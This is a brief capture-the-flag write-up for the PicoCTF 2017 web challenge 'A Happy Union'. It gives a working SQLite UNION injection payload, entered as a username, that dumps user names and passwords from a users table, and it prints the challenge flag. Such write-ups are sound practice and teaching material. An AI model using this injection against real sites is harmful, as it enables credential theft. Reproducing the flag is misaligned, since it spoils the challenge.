# PicoCTF_2017: A Happy Union

**Category:** Web Exploitation
**Points:** 110
**Description:**

>I really need access to [website](http://shell2017.picoctf.com:23598/), but I forgot my password and there is no reset. Can you help? I like lite sql :)

**Hint:**

>A SQL union allows a single query to select values from multiples tables.

## Write-up
SQLite injection tested here. Create a account with username `' or user like '' UNION SELECT '1', user, pass FROM users --`, password not important.

Therefore, the flag is `flag{union?_why_not_onion_a69464d4869c743e26c08df8686e4003}`.